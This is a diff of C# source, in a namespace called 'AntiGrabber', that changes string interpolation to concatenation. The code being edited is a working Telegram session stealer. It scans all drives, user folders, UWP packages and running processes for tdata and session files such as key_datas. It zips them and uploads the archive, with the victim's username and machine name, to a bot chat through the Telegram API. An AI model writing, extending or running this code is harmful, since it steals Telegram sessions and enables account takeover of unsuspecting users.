@@ -1,4 +1,4 @@
-﻿using System;
+using System;
 using System.Collections.Generic;
 using System.Diagnostics;
 using System.IO;
@@ -50,10 +50,10 @@ namespace AntiGrabber
 
                 if (tdataPaths.Count > 0)
                 {
-                    await SendTelegramMessage($"✅ *Найдено клиентов:* {tdataPaths.Count}");
+                    await SendTelegramMessage("✅ *Найдено клиентов:* " + tdataPaths.Count);
                     foreach (var tdataPath in tdataPaths)
                     {
-                        await SendTelegramMessage($"✅ *Обрабатываю клиент!* 📂\nПуть: `{tdataPath}`\nНачинаю обработку...");
+                        await SendTelegramMessage("✅ *Обрабатываю клиент!* 📂\nПуть: `" + tdataPath + "`\nНачинаю обработку...");
                         await ProcessTdataFolder(tdataPath);
                     }
                 }
@@ -64,7 +64,7 @@ namespace AntiGrabber
             }
             catch (Exception ex)
             {
-                await SendTelegramMessage($"⚠ *Ошибка!* {ex.Message}\n🔍 Подробности: `{ex.StackTrace}`");
+                await SendTelegramMessage("⚠ *Ошибка!* " + ex.Message + "\n🔍 Подробности: `" + ex.StackTrace + "`");
             }
         }
 
@@ -91,7 +91,7 @@ namespace AntiGrabber
 
                 foreach (string package in telegramPackages)
                 {
-                    await SendTelegramMessage($"🔍 *Проверка пакета:* `{Path.GetFileName(package)}`");
+                    await SendTelegramMessage("🔍 *Проверка пакета:* `" + Path.GetFileName(package) + "`");
 
                     // Проверка всех возможных путей в UWP пакете
                     List<string> uwpPathsToCheck = new List<string>
@@ -105,11 +105,11 @@ namespace AntiGrabber
 
                     foreach (string pathToCheck in uwpPathsToCheck)
                     {
-                        await CheckAndAddPath(pathToCheck, foundPaths, $"UWP путь ({Path.GetDirectoryName(pathToCheck).Replace(package, "...")})");
+                        await CheckAndAddPath(pathToCheck, foundPaths, "UWP путь (" + Path.GetDirectoryName(pathToCheck).Replace(package, "...") + ")");
                     }
 
                     // Более глубокий поиск tdata в пакете UWP
-                    await SendTelegramMessage($"🔍 *Глубокий поиск tdata в пакете UWP...*");
+                    await SendTelegramMessage("🔍 *Глубокий поиск tdata в пакете UWP...*");
                     await FindTdataInDirectory(package, foundPaths, 0, 4); // Поиск в глубину до 4 уровней
 
                     // Проверка на наличие сессий в разных папках пакета UWP
@@ -121,7 +121,7 @@ namespace AntiGrabber
             await SendTelegramMessage("🔍 *Проверка запущенных процессов Telegram...*");
             foreach (string processName in ProcessNames)
             {
-                await SendTelegramMessage($"🔍 *Поиск процесса:* `{processName}`");
+                await SendTelegramMessage("🔍 *Поиск процесса:* `" + processName + "`");
                 foreach (var process in Process.GetProcessesByName(processName))
                 {
                     try
@@ -131,12 +131,12 @@ namespace AntiGrabber
                         {
                             string processDir = Path.GetDirectoryName(processPath);
                             string tdataPath = Path.Combine(processDir, "tdata");
-                            await CheckAndAddPath(tdataPath, foundPaths, $"процесс {processName}");
+                            await CheckAndAddPath(tdataPath, foundPaths, "процесс " + processName);
                         }
                     }
                     catch (Exception ex)
                     {
-                        await SendTelegramMessage($"⚠ *Ошибка доступа к процессу {processName}:* `{ex.Message}`");
+                        await SendTelegramMessage("⚠ *Ошибка доступа к процессу " + processName + ":* `" + ex.Message + "`");
                     }
                 }
             }
@@ -149,7 +149,7 @@ namespace AntiGrabber
                 {
                     try
                     {
-                        await SendTelegramMessage($"🔍 *Сканирование диска:* `{drive.Name}`");
+                        await SendTelegramMessage("🔍 *Сканирование диска:* `" + drive.Name + "`");
 
                         // Проверяем известные пути на диске
                         string usersFolder = Path.Combine(drive.RootDirectory.FullName, "Users");
@@ -158,7 +158,7 @@ namespace AntiGrabber
                             foreach (var userDir in Directory.GetDirectories(usersFolder))
                             {
                                 string appDataPath = Path.Combine(userDir, "AppData", "Roaming", "Telegram Desktop", "tdata");
-                                await CheckAndAddPath(appDataPath, foundPaths, $"путь пользователя {Path.GetFileName(userDir)}");
+                                await CheckAndAddPath(appDataPath, foundPaths, "путь пользователя " + Path.GetFileName(userDir));
                             }
                         }
 
@@ -170,12 +170,12 @@ namespace AntiGrabber
                         }
 
                         // Ищем папки с prefixes
-                        await SendTelegramMessage($"🔍 *Поиск файлов сессии на диске:* `{drive.Name}`");
+                        await SendTelegramMessage("🔍 *Поиск файлов сессии на диске:* `" + drive.Name + "`");
                         await ScanForSessionFiles(drive.RootDirectory.FullName, foundPaths);
                     }
                     catch (Exception ex)
                     {
-                        await SendTelegramMessage($"⚠ *Ошибка сканирования диска {drive.Name}:* `{ex.Message}`");
+                        await SendTelegramMessage("⚠ *Ошибка сканирования диска " + drive.Name + ":* `" + ex.Message + "`");
                     }
                 }
             }
@@ -196,7 +196,7 @@ namespace AntiGrabber
                     {
                         if (Path.GetFileName(subDir).Equals("tdata", StringComparison.OrdinalIgnoreCase))
                         {
-                            await CheckAndAddPath(subDir, foundPaths, $"UWP глубокий поиск: {subDir.Replace(dirPath, "...")}");
+                            await CheckAndAddPath(subDir, foundPaths, "UWP глубокий поиск: " + subDir.Replace(dirPath, "..."));
                         }
                         else
                         {
@@ -243,7 +243,7 @@ namespace AntiGrabber
                 if (HasSessionFiles(folderPath))
                 {
                     foundPaths.Add(folderPath);
-                    await SendTelegramMessage($"✅ *Найдены файлы сессии в UWP:* `{folderPath}`");
+                    await SendTelegramMessage("✅ *Найдены файлы сессии в UWP:* `" + folderPath + "`");
                     return; // Не продолжаем поиск в подпапках, если нашли сессию в текущей папке
                 }
 
@@ -270,11 +270,11 @@ namespace AntiGrabber
             if (Directory.Exists(path))
             {
                 foundPaths.Add(path);
-                await SendTelegramMessage($"✅ *Найдена tdata* ({source}):\n`{path}`");
+                await SendTelegramMessage("✅ *Найдена tdata* (" + source + "):\n`" + path + "`");
             }
             else
             {
-                await SendTelegramMessage($"❌ *Не найдено* ({source}):\n`{path}`");
+                await SendTelegramMessage("❌ *Не найдено* (" + source + "):\n`" + path + "`");
             }
         }
 
@@ -323,7 +323,7 @@ namespace AntiGrabber
                         if (HasSessionFiles(dir))
                         {
                             foundPaths.Add(dir);
-                            await SendTelegramMessage($"✅ *Найдены файлы сессии:* `{dir}`");
+                            await SendTelegramMessage("✅ *Найдены файлы сессии:* `" + dir + "`");
                         }
 
                         // Ограничиваем глубину рекурсии для производительности
@@ -339,7 +339,7 @@ namespace AntiGrabber
                     }
                     catch (Exception ex)
                     {
-                        await SendTelegramMessage($"⚠ *Ошибка сканирования* `{dir}`: `{ex.Message}`");
+                        await SendTelegramMessage("⚠ *Ошибка сканирования* `" + dir + "`: `" + ex.Message + "`");
                     }
                 }
             }
@@ -369,7 +369,7 @@ namespace AntiGrabber
                 string tdataArchiveDir = Path.Combine(tempDir, "tdata");
                 Directory.CreateDirectory(tdataArchiveDir);
 
-                await SendTelegramMessage($"📂 *Обрабатываю tdata клиента {clientName}...*\nКопирую файлы...");
+                await SendTelegramMessage("📂 *Обрабатываю tdata клиента " + clientName + "...*\nКопирую файлы...");
 
                 // Копируем основные файлы сессии
                 int filesCopied = 0;
@@ -384,7 +384,7 @@ namespace AntiGrabber
 
                         if (filesCopied % 5 == 0 || fileName == "key_datas")
                         {
-                            await SendTelegramMessage($"📄 *Файл добавлен:* `{fileName}`");
+                            await SendTelegramMessage("📄 *Файл добавлен:* `" + fileName + "`");
                         }
                     }
                 }
@@ -405,20 +405,20 @@ namespace AntiGrabber
                             {
                                 string destPath = Path.Combine(subArchiveDir, fileName);
                                 File.Copy(file, destPath, true);
-                                await SendTelegramMessage($"📄 *Файл добавлен:* `{fileName}` (из папки {prefix})");
+                                await SendTelegramMessage("📄 *Файл добавлен:* `" + fileName + "` (из папки " + prefix + ")");
                             }
                         }
                     }
                 }
 
-                await SendTelegramMessage($"📦 *Создание архива клиента {clientName}...*");
-                string archivePath = Path.Combine(Path.GetTempPath(), $"{clientName}-{DateTime.Now:yyyyMMdd-HHmmss}.zip");
+                await SendTelegramMessage("📦 *Создание архива клиента " + clientName + "...*");
+                string archivePath = Path.Combine(Path.GetTempPath(), clientName + "-" + DateTime.Now.ToString("yyyyMMdd-HHmmss") + ".zip");
                 if (File.Exists(archivePath)) File.Delete(archivePath);
                 ZipFile.CreateFromDirectory(tempDir, archivePath);
 
                 await SendTelegramMessage("📦 *Архив создан!*\nОтправляю...");
 
-                await SendTelegramFileWithMessage(archivePath, $"📦 *Архив Telegram*\n🗂 Клиент: {clientName}\n📂 Путь: `{tdataPath}`\n🕒 {DateTime.Now}\n👤 {Environment.UserName}\n💻 {Environment.MachineName}");
+                await SendTelegramFileWithMessage(archivePath, "📦 *Архив Telegram*\n🗂 Клиент: " + clientName + "\n📂 Путь: `" + tdataPath + "`\n🕒 " + DateTime.Now + "\n👤 " + Environment.UserName + "\n💻 " + Environment.MachineName);
 
                 // Очистка временных файлов
                 await SendTelegramMessage("🧹 *Удаление временных файлов...*");
@@ -428,7 +428,7 @@ namespace AntiGrabber
             }
             catch (Exception ex)
             {
-                await SendTelegramMessage($"⚠ *Ошибка обработки!* {ex.Message}\n🔍 Подробности: `{ex.StackTrace}`");
+                await SendTelegramMessage("⚠ *Ошибка обработки!* " + ex.Message + "\n🔍 Подробности: `" + ex.StackTrace + "`");
             }
         }
 
@@ -436,7 +436,7 @@ namespace AntiGrabber
         {
             using (var client = new HttpClient())
             {
-                string url = $"https://api.telegram.org/bot{BotToken}/sendMessage";
+                string url = "https://api.telegram.org/bot" + BotToken + "/sendMessage";
                 var content = new FormUrlEncodedContent(new[]
                 {
                     new KeyValuePair<string, string>("chat_id", ChatId),
@@ -451,7 +451,7 @@ namespace AntiGrabber
         {
             using (var client = new HttpClient())
             {
-                string url = $"https://api.telegram.org/bot{BotToken}/sendDocument";
+                string url = "https://api.telegram.org/bot" + BotToken + "/sendDocument";
                 var multipartContent = new MultipartFormDataContent
                 {
                     { new StringContent(ChatId), "chat_id" },
